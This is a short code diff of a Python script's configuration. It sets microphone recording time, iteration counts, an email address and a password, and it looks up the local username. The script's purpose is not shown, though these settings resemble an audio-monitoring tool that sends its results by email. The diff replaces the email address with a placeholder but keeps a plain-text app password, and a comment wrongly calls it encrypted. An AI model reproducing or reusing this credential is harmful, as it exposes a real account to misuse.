@@ -39,8 +39,8 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "onlyforproject728@gmail.com" 
-password = "yplsgtcdtquvtaqs" 
+email_address = "<PLEASE WRITE YOUR EMAIL>" 
+password = "yplsgtcdtquvtaqs" #WRITE YOUR ENCRYPTED PASSWORD
 
 username = getpass.getuser()
 
